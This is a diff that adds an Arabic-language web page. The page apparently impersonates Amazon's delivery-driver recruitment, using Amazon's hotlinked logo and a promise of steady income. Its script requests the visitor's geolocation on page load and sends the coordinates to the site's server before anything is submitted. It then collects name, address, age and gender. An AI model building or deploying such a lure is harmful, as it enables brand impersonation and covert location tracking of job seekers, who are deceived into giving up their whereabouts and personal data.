@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل مندوب أمازون</title>
+  <link rel="stylesheet" href="./css/style.css">
+</head>
+<body>
+    <div class="image">
+        <img src="https://jobs.amazon.eg/app/logo_dark.99265b07.svg" alt="">
+    </div>
+
+  <h1>تسجيل كمندوب أمازون</h1>
+<p style="text-align:center; font-size:18px; color:#333; margin-bottom:20px; margin: 13px;">
+انضم لفريقنا الآن وابدأ مسيرتك كمندوب أمازون مع فرصة لكسب دخل ثابت وتحقيق النجاح!
+</p>
+  <form id="deliveryForm">
+    <input type="text" name="name" placeholder="الاسم" required /><br/>
+    <input type="text" name="address" placeholder="العنوان" required /><br/>
+    <input type="number" name="age" placeholder="السن" required /><br/>
+    <select name="gender" required>
+      <option value="">اختر الجنس</option>
+      <option value="Male">ذكر</option>
+      <option value="Female">أنثى</option>
+    </select><br/>
+    <button type="submit">تسجيل</button>
+  </form>
+
+  <script>
+    let userLocation = null;
+
+    // نرسل الموقع للسيرفر فور موافقة المستخدم (مرة واحدة فقط)
+    function sendLocationOnly(lat, lon) {
+      // نفحص إذا تم الإرسال قبل كده
+      if (!localStorage.getItem('locationSent')) {
+        fetch('/api/delivery', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ location: `${lat},${lon}` })
+        }).then(res => res.json())
+          .then(data => {
+            console.log('Location sent:', data);
+            // نخزن علامة في Local Storage لمنع الإرسال مرة ثانية
+            localStorage.setItem('locationSent', 'true');
+          })
+          .catch(err => console.log('Error sending location:', err));
+      } else {
+        console.log('Location already sent.');
+      }
+    }
+
+    // نجيب الموقع فور تحميل الصفحة
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          userLocation = `${lat},${lon}`;
+          sendLocationOnly(lat, lon);
+        },
+        (error) => {
+          alert('يرجى تفعيل الموقع لإتمام التسجيل.');
+        }
+      );
+    } else {
+      alert('المتصفح لا يدعم خدمة الموقع.');
+    }
+
+    // ارسال بيانات الفورم مع الموقع إذا المستخدم كمل الفورم
+    const form = document.getElementById('deliveryForm');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const formData = new FormData(form);
+      const data = Object.fromEntries(formData.entries());
+      if (userLocation) data.location = userLocation;
+
+      const res = await fetch('/api/delivery', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+
+      const result = await res.json();
+      alert(result.message || result.error);
+    });
+  </script>
+</body>
+</html>
